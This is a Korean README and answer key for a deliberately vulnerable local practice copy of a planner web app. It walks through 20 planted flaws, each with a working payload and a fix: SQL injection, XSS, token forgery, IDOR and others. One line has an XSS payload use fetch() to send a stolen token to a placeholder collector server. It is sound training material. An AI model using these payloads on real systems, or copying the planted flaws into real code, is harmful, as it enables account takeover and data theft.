# PlanDoSee 취약점 연습용 사본 — README (정답지)

원본(`D:\Aleph\PDS`)을 복사해서, 학습 목적으로 20가지 취약점을 의도적으로 심었습니다.
백엔드는 Supabase가 아니라 **이 컴퓨터에서만 도는 작은 Node.js 서버(SQLite 사용)**입니다 —
클라우드 계정도, 인터넷 노출도 전혀 필요 없습니다.

**이 폴더는 절대 인터넷에 배포하거나 공유하지 마세요.**

---

## 0. 폴더 구조

```
PDS-vuln/
├── index.html                  (최소 placeholder 홈)
├── api-client.js                (원래 Supabase 클라이언트를 대체하는 로컬 API 클라이언트)
├── README.md                    (이 파일)
├── clickjack-poc.html           (VULN #19 클릭재킹 PoC)
├── PDS/
│   ├── PlanDoSee.html            (메인 앱 — 취약점 대부분이 여기 있음)
│   ├── PlanDoSee_login.html      (로그인/회원가입)
│   ├── PlanDoSee_verify.html     (이메일 인증 화면 — 로컬 버전에선 사실상 미사용)
│   └── PlanDoSee_logo.png
├── local-server/                 (로컬 모의 백엔드: 인증 + DB + 파일 저장)
│   ├── package.json
│   ├── db.js                     (SQLite 스키마)
│   └── server.js                 (Express API — 대부분의 취약점이 여기 있음)
└── server-side-demos/            (SQLi/파일업로드 외 나머지 서버 실행형 취약점 3종 — 별도 독립 실습)
    ├── README.md
    ├── command_injection_demo.js
    ├── ssrf_demo.js
    └── xxe_demo.py
```

---

## 1. 준비 과정 (5분)

```
cd PDS-vuln/local-server
npm install
npm start
```

`npm install`은 컴파일러 없이 순수 JS(sql.js)라서 빠르게 끝납니다. 실행하면 터미널에
`http://localhost:4000/PDS/PlanDoSee_login.html` 이라고 뜹니다 — 브라우저로 그 주소를 여세요.
같은 서버가 정적 파일도, API도 전부 같이 서빙하기 때문에 이거 하나만 실행하면 됩니다.

서버는 `127.0.0.1`에만 바인딩되어 있어서 이 컴퓨터 밖에서는 접근할 수 없습니다. 실행 중에는
`local-server/data.db`(SQLite 파일)와 `local-server/uploads/`(업로드된 파일)가 자동으로 생깁니다.

회원가입 화면에서 최소 2개 계정을 만드세요:
- `test1@test.local` / 아무 비밀번호(6자 이상)
- `test2@test.local` / 아무 비밀번호(6자 이상)

로그인 화면 소스에 남겨둔 "유출된" 테스트 계정과 맞추고 싶다면 `admin@test.local`도
하나 더 만들어두세요. 이메일 인증 절차가 아예 없어서(로컬 서버는 이메일을 보내지 않음),
가입하면 바로 로그인됩니다. 각 계정으로 로그인해서 계획/할 일을 몇 개씩 입력해두면
실습이 훨씬 실감납니다.

---

## 2. 취약점 20개 목록 (요약)

| # | 취약점 | 위치 | 한 줄 힌트 |
|---|---|---|---|
| 1 | SQL 인젝션 | `PlanDoSee.html` "서버 검색(고급)" → `local-server/server.js`의 `pds_search_todos_vuln` | 문자열 결합으로 동적 SQL 실행 |
| 2 | 저장형 XSS | `PlanDoSee.html` 할 일 메모 | `todo.note`를 이스케이프 없이 렌더링 |
| 3 | 반사형(스타일) XSS | `PlanDoSee_login.html` | `?notice=` 쿼리를 이스케이프 없이 출력 |
| 4 | DOM 기반 XSS | `PlanDoSee.html` | `#preview=` 해시를 이스케이프 없이 출력 |
| 5 | 상태를 바꾸는 GET (CSRF 유사) | `PlanDoSee.html` | `?quickAction=clearAllTodos`로 확인 없이 전체 삭제 |
| 6 | IDOR | `PlanDoSee.html` `?planId=` + `local-server/server.js` | select/update에 소유자 제한이 없는 테이블(pds_plans, pds_todos) |
| 7 | 깨진 접근 제어 | `PlanDoSee.html` 관리자 버튼 | "관리자" 판정이 클라이언트 코드(이메일 하드코딩)뿐 |
| 8 | 깨진 인증(계정 열거 + 무제한 시도) | `local-server/server.js` 로그인 라우트 | "계정 없음"/"비번 틀림"을 다른 메시지로 알려줌, 시도 횟수 제한 없음 |
| 9 | 위조 가능한 세션 토큰 | `local-server/server.js` | 서명 없는 base64 토큰 — 디코딩 후 id만 바꾸면 계정 탈취 |
| 10 | 커맨드 인젝션 | `server-side-demos/command_injection_demo.js` | 별도 데모, `exec()`에 입력 그대로 결합 |
| 11 | XXE | `server-side-demos/xxe_demo.py` | 별도 데모, 외부 엔티티 해석 허용 |
| 12 | SSRF | `server-side-demos/ssrf_demo.js` | 별도 데모, URL 목적지 검증 없음 |
| 13 | 파일 업로드 취약점 | `PlanDoSee.html` 할 일 첨부파일 | 확장자/크기 검증 전혀 없음, 인증 없이 전체 공개 |
| 14 | 경로 탐색(Path Traversal) | `local-server/server.js` 업로드 라우트 | 파일명을 검증 없이 디스크 경로에 그대로 사용 |
| 15 | 안전하지 않은 역직렬화(유사) | `PlanDoSee.html` "설정 가져오기" | 가져온 JSON의 `onLoadScript`를 `new Function()`으로 실행 |
| 16 | 보안 설정 미흡 | `PlanDoSee_login.html` 주석, 로컬 서버 이메일 인증 없음 | 유출된 테스트 계정 흔적, 가입 즉시 로그인 |
| 17 | 민감 정보 노출 | `local-server/data.db` | 비밀번호가 평문으로 DB에 그대로 저장됨 |
| 18 | 취약한 컴포넌트 | `local-server/package.json` | express를 오래된 버전(4.17.1)에 고정 |
| 19 | 클릭재킹 | `clickjack-poc.html` | Express 기본 응답엔 프레임 차단 헤더가 없음 |
| 20 | 비즈니스 로직 취약점 | `PlanDoSee.html` 예상 시간 입력 | `min="0"` 제거 + 서버 쪽 범위 제약도 없음 |

---

## 3. 상세 공략법

### #1 SQL 인젝션
"오늘 하루" 화면의 **"서버 검색(고급)"** 입력창에 다음을 넣고 검색 버튼을 눌러보세요.
```
zzz' OR '1'='1' -- 
```
(끝에 공백까지 포함) — 검색어와 무관하게, 다른 계정으로 만든 할 일까지 전부 반환됩니다.
왜 `-- `가 꼭 필요하냐면, 서버 코드가 `'%${keyword}%'`처럼 앞뒤로 `%`와 따옴표를 자동으로
붙이기 때문에, `-- `로 그 뒤에 자동으로 붙는 `%'` 부분을 SQL 주석 처리해서 무력화해야
`'1'='1'`이 깨끗하게 참이 됩니다. (SQL 인젝션을 연습할 때 "내가 넣은 값 앞뒤로 뭐가
자동으로 붙는지"를 파악하는 게 실전에서도 중요한 감각입니다.)

sqlmap으로도 연습할 수 있어요. 엔드포인트는 `POST http://localhost:4000/api/rpc/pds_search_todos_vuln`,
헤더에 `Authorization: Bearer {로그인 후 localStorage의 pds_token 값}`, 본문 `{"keyword": "test"}` —
`keyword` 값을 `--data`로 지정해서 테스트하세요.

**고치려면:** 문자열 결합 대신 파라미터 바인딩(`?` 플레이스홀더)을 쓰면 됩니다. 사실
`local-server/server.js`의 다른 모든 라우트는 이미 그렇게 되어 있어요 — 이 RPC 하나만
일부러 예외로 만들어뒀습니다. 그 차이를 코드에서 직접 비교해보세요.

### #2 저장형 XSS
아무 할 일의 "메모"란에 `<img src=x onerror=alert(document.cookie)>` 를 입력하고
포커스를 빼보세요(저장됨). 페이지를 새로고침하면 alert가 뜹니다. #6(IDOR)과 결합하면
다른 계정으로 로그인해도 같은 alert가 뜨는 걸 확인할 수 있습니다(계정을 넘나드는 웜성 XSS).

**고치려면:** 원본처럼 `escapeHtml(todo.note)`로 되돌리면 됩니다.

### #3 반사형(스타일) XSS
로그인 화면 URL을 다음처럼 열어보세요:
```
http://localhost:4000/PDS/PlanDoSee_login.html?notice=<img src=x onerror=alert(1)>
```

**고치려면:** `innerHTML` 대신 `textContent`를 쓰거나, 넣기 전에 이스케이프하세요.

### #4 DOM 기반 XSS
로그인 후 메인 화면에서 URL 해시를 다음처럼 바꿔보세요:
```
http://localhost:4000/PDS/PlanDoSee.html#preview=<img src=x onerror=alert(document.domain)>
```

**고치려면:** 마찬가지로 이스케이프 후 렌더링하세요.

### #5 상태를 바꾸는 GET (CSRF 유사 패턴)
로그인한 상태에서 다음 링크를 열어보세요(테스트 계정으로만!):
```
http://localhost:4000/PDS/PlanDoSee.html?quickAction=clearAllTodos
```
확인창 없이 할 일이 전부 삭제됩니다.

**참고:** 이 앱은 쿠키가 아니라 localStorage 토큰(Authorization 헤더)으로 인증하기 때문에,
`evil.com`처럼 완전히 다른 사이트가 이 요청을 "몰래 대신" 보내게 만드는 고전적 CSRF와는
메커니즘이 다릅니다. "확인 없이 파괴적 동작이 실행된다"는 실수 자체가 실무에서 흔한
패턴이라 넣었습니다.

**고치려면:** 파괴적 동작은 GET이 아니라 POST/DELETE로, 그리고 실행 전 확인 절차를 넣으세요.

### #6 IDOR
아무 계정으로 로그인한 뒤, 다른 계정으로 만든 계획의 id를 알아내서(개발자도구 Network
탭에서 `/api/pds_plans` 응답을 보면 원래 내 것이 아닌 계획도 이미 같이 와있는 걸 확인할
수 있습니다) 다음처럼 접속해보세요:
```
http://localhost:4000/PDS/PlanDoSee.html?planId=<그-계획의-uuid>
```
콘솔(F12)에 그 계획 데이터가 그대로 출력됩니다.

**고치려면:** `local-server/server.js`의 `TABLE_CONFIG`에서 `pds_plans`/`pds_todos`의
`scope.select`, `scope.update`를 `"all"`에서 `"owner"`로 바꾸면 됩니다 (바로 옆에 있는
`pds_tags`/`pds_settings`가 이미 `"owner"`로 올바르게 되어있으니 비교해보세요).

### #7 깨진 접근 제어
`admin@test.local`이 아닌 계정으로 로그인한 상태에서 개발자도구 콘솔에 다음을 입력해보세요:
```js
document.querySelector('#admin-dashboard-button').hidden = false;
```
버튼이 나타나고, 클릭하면 관리자가 아닌데도 전체 사용자 데이터가 조회됩니다.

**고치려면:** "관리자인지"는 클라이언트가 아니라 서버가 판단해야 합니다 (예: 서버에
`is_admin` 같은 필드를 두고, 해당 라우트에서 `req.authUser`가 관리자인지 서버 쪽에서
직접 확인).

### #8 깨진 인증 (계정 열거 + 무제한 시도)
로그인 화면에 아무 이메일이나 넣어보세요 — "그런 계정 없어요"와 "비밀번호가 틀려요"가
서로 다르게 뜹니다. 이걸로 가입된 이메일 목록을 하나씩 알아낼 수 있고, 시도 횟수 제한도
없어서 비밀번호 무차별 대입까지 이어질 수 있습니다.

**고치려면:** `local-server/server.js`의 로그인 라우트에서 두 경우 모두 같은 에러
메시지("이메일 또는 비밀번호가 올바르지 않아요")로 통일하고, 연속 실패 시 지연/잠금을 추가하세요.

### #9 위조 가능한 세션 토큰
로그인한 상태에서 개발자도구 콘솔에 이렇게 해보세요:
```js
const k = Object.keys(localStorage).find(x => x.includes("pds_token"));
console.log(JSON.parse(atob(localStorage.getItem(k))));   // 내 id/email이 그대로 보임
```
이제 비밀번호를 몰라도, 다른 사람 id로 토큰을 새로 만들어서 그 사람 행세를 할 수 있습니다:
```js
localStorage.setItem(k, btoa(JSON.stringify({ id: 1, email: "test1@test.local" })));
location.reload();
```
(user id는 1, 2, 3...처럼 순서대로 늘어나는 값이라 추측하기도 쉽습니다.) #2(저장형 XSS)와
엮으면, XSS 페이로드가 `localStorage`에서 토큰을 훔쳐서 공격자 서버로 보내는 것도 연습해볼
수 있습니다: `fetch('https://내가띄운수집서버/log?t='+localStorage.getItem(k))`.

**고치려면:** 토큰을 서버만 아는 비밀키로 서명(HMAC 또는 JWT)해서, 서버가 매 요청마다
서명을 검증하고 내용을 신뢰하기 전에 진짜 그 서버가 발급한 게 맞는지 확인해야 합니다.

### #10~#12 커맨드 인젝션 / XXE / SSRF
`server-side-demos/README.md`를 참고하세요. PlanDoSee 사본과 완전히 별개인
작은 독립 서버 3개로 따로 연습합니다.

### #13/#14 파일 업로드 + 경로 탐색
아무 할 일 항목의 "파일 선택"으로 아무 파일이나(확장자 무관, `.exe`도) 올려보세요 — 검증이
전혀 없이 바로 업로드됩니다. 업로드된 파일은 `http://localhost:4000/uploads/pds-attachments/<파일명>`
으로 **로그인 없이** 누구나 접근할 수 있습니다. 또한 서버(`local-server/server.js`)가 파일명을
전혀 정규화하지 않고 그대로 디스크 경로에 쓰기 때문에, 이론적으로 `../`가 포함된 파일명은
`local-server/uploads/pds-attachments/` 바깥으로 실제로 빠져나갈 수 있습니다 — 이건 이 컴퓨터의
실제 파일시스템에 영향을 주는 만큼 각별히 조심해서, 꼭 필요하면 `curl`로 안전한 경로 안에서만
테스트해보세요(예: `path=test-subdir/ok.txt`처럼 하위 폴더 생성까지는 확인해보되, 실제로 상위
폴더를 탈출하는 페이로드는 굳이 실행하지 않아도 원리를 이해하는 데는 충분합니다).

**고치려면:** 업로드 키를 `{user_id}/{uuid}-{원본파일명}` 형태로 사용자별로 분리하고,
파일명에서 `..`, `/` 같은 경로 구분자를 제거(또는 전부 새 uuid로 대체)하세요. MIME
타입/확장자 화이트리스트와 크기 제한도 추가하고, `/uploads` 라우트에 인증을 추가하세요.

### #15 안전하지 않은 역직렬화(analog)
상단 **"설정 가져오기"** 버튼을 누르고 다음 JSON을 붙여넣어보세요:
```json
{"onLoadScript": "alert('가져온 설정에서 임의 코드 실행됨: ' + document.cookie)"}
```

**고치려면:** 가져온 데이터는 절대 코드로 실행하지 말고, 알고 있는 필드만 화이트리스트로
골라서 적용하세요. `new Function`/`eval`은 애초에 쓰지 마세요.

### #16/#17 보안 설정 미흡 · 민감 정보 노출
`PDS/PlanDoSee_login.html` 맨 위 주석을 열어보세요 — 배포 전에 지웠어야 할 것 같은 테스트
계정 흔적이 남아있습니다. 그리고 서버를 한 번이라도 켜서 회원가입을 했다면,
`local-server/data.db` 파일이 생겼을 거예요. DB Browser for SQLite 같은 무료 도구로
그 파일을 열어서 `users` 테이블을 확인해보세요 — **비밀번호가 평문 그대로** 저장되어 있습니다.

**고치려면:** 코드/주석의 테스트 계정 흔적은 커밋 전에 지우고, 비밀번호는 반드시 bcrypt 같은
느린 해시 알고리즘으로 저장하세요 (`local-server/server.js`의 signup/signin 라우트에서
`user.password !== password` 비교 부분을 `bcrypt.compare()`로 바꾸는 연습을 해봐도 좋습니다).

### #18 취약한 컴포넌트
`local-server/package.json`을 열어보면 `"express": "4.17.1"`로 특정 옛날 버전(2020년 릴리스)에
고정되어 있습니다. `npm install` 후 `npm audit`을 돌려보세요 — 덤으로 `multer`도 1.x라서
알려진 취약점이 함께 나올 거예요 (이건 일부러 고른 건 아니고, 1.x 계열 자체가 이미 알려진
이슈가 있어서 자연스럽게 같이 걸립니다 — 실무에서도 "의존성의 의존성"까지 감사가 필요한 이유입니다).

**고치려면:** `npm audit fix` 또는 버전을 최신 안정판으로 올리고, 정기적으로 의존성 점검을
자동화(Dependabot, Snyk 등)하세요.

### #19 클릭재킹
서버를 켠 상태에서 `http://localhost:4000/clickjack-poc.html`을 열어보세요. 투명 iframe
위에 가짜 "쿠폰 받기" 버튼이 겹쳐있는 걸 볼 수 있습니다 (Express가 기본적으로
`X-Frame-Options`를 보내지 않기 때문입니다).

**고치려면:** `local-server/server.js`에 다음을 추가하세요:
```js
app.use((req, res, next) => { res.setHeader("X-Frame-Options", "DENY"); next(); });
```

### #20 비즈니스 로직 취약점
"이번 계획들" → "+ 새 계획"에서 예상 시간(분)에 `-500`을 입력해보세요. 저장이 됩니다
(HTML `min="0"`도 지웠고, 서버 쪽에도 범위 검증이 없습니다). "돌아보기" 화면의 통계가
이상하게 계산되는 걸 확인해보세요.

**고치려면:** `local-server/server.js`의 pds_plans/pds_todos insert·update 핸들러에
`estimated_minutes`가 음수면 거부하는 검증을 추가하고, 클라이언트에도 `min="0"`을
되돌리세요(클라이언트 검증은 사용자 경험용, 진짜 방어는 항상 서버 쪽이어야 한다는 걸
보여주는 좋은 예시입니다).

---

## 4. 실습이 끝나면

- 위 "고치려면"을 따라 하나씩 원복해보면서, 공격이 실제로 막히는지 다시 테스트해보세요
  (이게 가장 좋은 복습입니다).
- 서버는 터미널에서 Ctrl+C로 끄면 됩니다.
- 다 끝나면 `local-server/data.db`, `local-server/uploads/`를 지우고, 이 폴더 전체를
  절대 배포되지 않는 곳에 보관하거나 삭제하세요.
